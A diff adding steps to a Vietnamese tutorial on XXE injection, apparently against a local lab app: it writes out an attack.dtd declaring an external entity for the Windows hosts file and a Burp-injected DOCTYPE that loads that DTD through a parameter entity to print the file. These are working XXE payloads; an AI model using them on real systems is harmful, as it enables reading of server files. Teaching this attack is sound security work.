@@ -35,5 +35,24 @@ Dòng đầu tiên là Khai báo XML (XML declaration), nó nên có chứ khôn
 - Tiếp theo, tôi sẽ chèn thêm đoạn code sau `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>` - (nghĩa là trỏ đến tệp hosts của system bên ngoài và lấy dữ liệu của nó ra và đẩy lên element `user`). Kết quả (hình dưới).
 ![Hình 3.](~/../img/3.png)
 
+- Tiếp theo, tôi sẽ sẽ tạo 1 file `attack.dtd` có nội dung như phía dưới và upload nó lên web:
+```DTD
+<?xml version="1.0" encoding="UTF-8"?>
+    <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+```
+
+- Tôi sẽ dùng Burp để có thể chèn đoạn xml sau vào để gọi file `attack.dtd` ra và chạy nó để in ra data của file hosts. Trong đây, có thể thấy tôi dùng `% remote` đây là 1 thực thể tham số xml rất đặc biệt và chúng ta có thể được tham chiếu chúng ở những nơi khác trong DTD. Còn `%remote;` ở phía dưới mục đích là thực hiện dòng lệnh `% remote` ở phía trên. Kết quả như hình phía dưới.
+```xml
+<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://localhost/XML/uploads/attack.dtd">
+    %remote;
+    ]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+```
+![Hình 4.](~/../img/4.png)
+
+
 
 
